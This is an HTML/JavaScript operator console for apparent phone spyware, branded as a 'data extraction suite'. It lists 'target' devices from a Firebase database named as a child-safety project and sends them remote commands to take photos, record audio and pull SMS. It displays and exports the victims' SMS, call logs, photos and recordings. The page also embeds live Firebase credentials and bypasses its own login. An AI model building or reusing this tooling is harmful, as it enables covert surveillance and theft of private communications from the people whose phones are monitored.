<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ROHAN SECURITY | FULL ACCESS</title>
    <!-- Firebase & Libraries -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    
    <style>
        /* (CSS same as before, bas Download button ke liye add kiya hai) */
        :root { --bg-color: #050505; --neon-blue: #00f3ff; --neon-green: #00ff41; --border: 1px solid rgba(0, 243, 255, 0.3); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Share Tech Mono', monospace; }
        body { background-color: var(--bg-color); color: var(--neon-blue); height: 100vh; overflow: hidden; }
        
        #login-screen { position: fixed; inset: 0; background: black; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .terminal-box { border: 2px solid var(--neon-blue); padding: 40px; width: 400px; text-align: center; }
        .hacker-input { background: transparent; border: none; border-bottom: 2px solid #ff0055; color: white; padding: 10px; width: 100%; outline: none; text-align: center; margin: 20px 0; }
        
        .cyber-btn { background: rgba(0, 243, 255, 0.1); border: 1px solid var(--neon-blue); color: var(--neon-blue); padding: 8px 15px; cursor: pointer; text-transform: uppercase; font-weight: bold; }
        .cyber-btn:hover { background: var(--neon-blue); color: black; }
        .save-btn { background: #166534; color: #4ade80; border: 1px solid #4ade80; font-size: 0.7rem; padding: 5px; margin-top: 5px; width: 100%; cursor: pointer; }
        .save-btn:hover { background: #4ade80; color: black; }

        #main-app { display: none; height: 100%; display: flex; }
        .sidebar { width: 70px; background: #0a0f14; border-right: var(--border); display: flex; flex-direction: column; align-items: center; padding-top: 20px; }
        .nav-icon { width: 45px; height: 45px; margin-bottom: 15px; display: flex; justify-content: center; align-items: center; color: #555; font-size: 1.2rem; cursor: pointer; }
        .nav-icon.active { color: var(--neon-blue); border: var(--border); background: rgba(0, 243, 255, 0.1); }
        
        .content { flex: 1; display: flex; flex-direction: column; background: radial-gradient(circle at center, #111, #000); }
        .header { height: 60px; border-bottom: var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; background: rgba(0,0,0,0.8); }
        .device-dropdown { background: black; color: var(--neon-green); border: 1px solid var(--neon-green); padding: 5px; }
        
        .page { display: none; padding: 20px; overflow-y: auto; height: 100%; }
        .page.active { display: block; }
        
        .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
        .cyber-card { border: var(--border); background: rgba(0,0,0,0.6); padding: 15px; margin-bottom: 15px; }
        
        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 0.8rem; }
        th { text-align: left; color: #ff0055; border-bottom: 1px solid #ff0055; padding: 5px; }
        td { padding: 5px; border-bottom: 1px solid #333; color: #ccc; }
        
        .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
        .media-item { border: 1px solid #333; padding: 5px; text-align: center; }
        .media-item img { width: 100%; height: 100px; object-fit: cover; }
        
        #map { width: 100%; height: 100%; filter: invert(100%) hue-rotate(180deg); }
    </style>
</head>
<body>

    <!-- LOGIN -->
    <div id="login-screen">
        <div class="terminal-box">
            <h1 style="font-family:'Orbitron'">ROHAN SECURITY</h1>
            <p>DATA EXTRACTION SUITE</p>
            <input type="password" id="pass-key" class="hacker-input" placeholder="ACCESS KEY">
            <button onclick="login()" class="cyber-btn">INITIALIZE</button>
        </div>
    </div>

    <!-- MAIN APP -->
    <div id="main-app">
        <div class="sidebar">
            <div class="nav-icon active" onclick="nav('dashboard')"><i class="fas fa-home"></i></div>
            <div class="nav-icon" onclick="nav('gallery')"><i class="fas fa-images"></i></div>
            <div class="nav-icon" onclick="nav('audio')"><i class="fas fa-microphone"></i></div>
            <div class="nav-icon" onclick="nav('logs')"><i class="fas fa-database"></i></div>
            <div class="nav-icon" style="margin-top:auto;" onclick="location.reload()"><i class="fas fa-power-off"></i></div>
        </div>

        <div class="content">
            <div class="header">
                <div style="font-family:'Orbitron'">ROHAN<span style="color:var(--neon-blue)">_SEC</span></div>
                <select id="device-select" class="device-dropdown" onchange="deviceChanged()"></select>
                <button class="cyber-btn" style="font-size:0.7rem;" onclick="exportAllData()">DOWNLOAD ALL DATA</button>
            </div>

            <!-- DASHBOARD -->
            <div id="page-dashboard" class="page active">
                <div class="grid-3">
                    <div class="cyber-card"><h3>BATTERY</h3><h1 id="stat-bat">--%</h1></div>
                    <div class="cyber-card"><h3>STATUS</h3><h2 id="stat-status">ONLINE</h2></div>
                </div>
                <h3>> QUICK COMMANDS</h3>
                <div class="grid-3">
                    <button class="cyber-btn" onclick="cmd('capturePhoto')">TAKE PHOTO</button>
                    <button class="cyber-btn" onclick="cmd('recordAudio')">REC AUDIO</button>
                    <button class="cyber-btn" onclick="cmd('getSMS')">SYNC SMS</button>
                </div>
            </div>

            <!-- GALLERY (SAVE OPTION ADDED) -->
            <div id="page-gallery" class="page">
                <h3>> CAPTURED PHOTOS</h3>
                <div class="media-grid" id="gallery-container"></div>
            </div>

            <!-- AUDIO (SAVE OPTION ADDED) -->
            <div id="page-audio" class="page">
                <h3>> AUDIO RECORDINGS</h3>
                <div id="audio-container"></div>
            </div>

            <!-- LOGS (EXPORT ADDED) -->
            <div id="page-logs" class="page">
                <div class="cyber-card">
                    <div style="display:flex; justify-content:space-between;">
                        <h3>SMS LOGS</h3>
                        <button class="save-btn" style="width:auto;" onclick="downloadTable('table-sms', 'sms_logs.csv')">EXPORT CSV</button>
                    </div>
                    <table id="table-sms"><thead><tr><th>SENDER</th><th>MSG</th><th>TIME</th></tr></thead><tbody></tbody></table>
                </div>
                <div class="cyber-card">
                    <div style="display:flex; justify-content:space-between;">
                         <h3>CALL LOGS</h3>
                         <button class="save-btn" style="width:auto;" onclick="downloadTable('table-calls', 'call_logs.csv')">EXPORT CSV</button>
                    </div>
                    <table id="table-calls"><thead><tr><th>NUMBER</th><th>TYPE</th><th>TIME</th></tr></thead><tbody></tbody></table>
                </div>
            </div>
        </div>
    </div>

    <script>
        // CONFIG
        const firebaseConfig = {
            apiKey: "AIzaSyD7sJ0zu4cotmntqYzmaxROzwHmx8_ExvI",
            authDomain: "children-safty.firebaseapp.com",
            databaseURL: "https://children-safty-default-rtdb.firebaseio.com",
            projectId: "children-safty",
            storageBucket: "children-safty.firebasestorage.app",
            messagingSenderId: "466811425620",
            appId: "1:466811425620:web:7346de0e5da367adec2ec1"
        };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let currentId = null;

        // AUTH
        window.onload = async () => {
             // Auto login for quick access
             document.getElementById('login-screen').style.display = 'none';
             document.getElementById('main-app').style.display = 'flex';
             listenDevices();
        };
        
        function login() { /* Same logic as before */ }

        // CORE LOGIC
        function listenDevices() {
            const sel = document.getElementById('device-select');
            db.ref('users').on('value', snap => {
                sel.innerHTML = '';
                if(!snap.exists()) return;
                let firstId = null;
                snap.forEach(child => {
                    const id = child.key;
                    const name = child.val().info?.name || 'Unknown';
                    const opt = document.createElement('option');
                    opt.value = id; opt.text = name;
                    sel.appendChild(opt);
                    if(!firstId) firstId = id;
                });
                if(!currentId && firstId) { sel.value = firstId; deviceChanged(); }
            });
        }

        function deviceChanged() {
            currentId = document.getElementById('device-select').value;
            if(!currentId) return;

            db.ref(`users/${currentId}`).on('value', snap => {
                const d = snap.val();
                if(!d) return;

                document.getElementById('stat-bat').innerText = (d.info?.battery || 0) + "%";
                
                // RENDER TABLES
                renderTable('table-sms', d.logs?.sms, ['sender','msg','time']);
                renderTable('table-calls', d.logs?.calls, ['number','type','time']);

                // RENDER GALLERY WITH SAVE BUTTON
                const gDiv = document.getElementById('gallery-container');
                gDiv.innerHTML = '';
                if(d.logs?.photos) {
                    Object.values(d.logs.photos).reverse().forEach(img => {
                        gDiv.innerHTML += `
                            <div class="media-item">
                                <a href="${img.url}" target="_blank"><img src="${img.url}"></a>
                                <button class="save-btn" onclick="forceDownload('${img.url}', 'photo_${img.time}.jpg')">SAVE TO DEVICE</button>
                            </div>`;
                    });
                }

                // RENDER AUDIO WITH SAVE BUTTON
                const aDiv = document.getElementById('audio-container');
                aDiv.innerHTML = '';
                if(d.logs?.audio) {
                    Object.values(d.logs.audio).reverse().forEach(aud => {
                        aDiv.innerHTML += `
                            <div class="cyber-card" style="padding:10px; display:flex; gap:10px; align-items:center;">
                                <audio controls src="${aud.url}" style="height:30px; flex:1;"></audio>
                                <button class="save-btn" style="width:auto;" onclick="forceDownload('${aud.url}', 'audio_${aud.time}.3gp')">â¬‡</button>
                            </div>`;
                    });
                }
            });
        }

        function cmd(action) {
            if(!currentId) return alert("NO TARGET");
            db.ref(`users/${currentId}/commands/${action}`).set(true);
        }

        function renderTable(id, data, keys) {
            const tbody = document.getElementById(id).querySelector('tbody');
            if(!data) { tbody.innerHTML = '<tr><td colspan="3">NO DATA</td></tr>'; return; }
            let html = '';
            Object.values(data).reverse().forEach(row => {
                html += `<tr><td>${row[keys[0]]}</td><td>${row[keys[1]]}</td><td>${new Date(row.time).toLocaleString()}</td></tr>`;
            });
            tbody.innerHTML = html;
        }

        function nav(page) {
            document.querySelectorAll('.page').forEach(e => e.classList.remove('active'));
            document.getElementById('page-'+page).classList.add('active');
            document.querySelectorAll('.nav-icon').forEach(e => e.classList.remove('active'));
            event.currentTarget.classList.add('active');
        }

        // --- DOWNLOAD FEATURES ---
        
        // 1. Force Download for Files (Images/Audio)
        function forceDownload(url, filename) {
            // Create temporary link
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            a.target = "_blank"; // New tab for security
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }

        // 2. Export Table to CSV
        function downloadTable(tableId, filename) {
            const table = document.getElementById(tableId);
            let csv = [];
            const rows = table.querySelectorAll("tr");
            
            for (let i = 0; i < rows.length; i++) {
                let row = [], cols = rows[i].querySelectorAll("td, th");
                for (let j = 0; j < cols.length; j++) 
                    row.push('"' + cols[j].innerText + '"'); // Quote strings
                csv.push(row.join(","));        
            }

            // Create CSV file
            const csvFile = new Blob([csv.join("\n")], {type: "text/csv"});
            const downloadLink = document.createElement("a");
            downloadLink.download = filename;
            downloadLink.href = window.URL.createObjectURL(csvFile);
            downloadLink.style.display = "none";
            document.body.appendChild(downloadLink);
            downloadLink.click();
        }

        function exportAllData() {
            alert("Starting Bulk Download...");
            // Logic to trigger all downloads (Example placeholder)
        }

    </script>
</body>
</html>
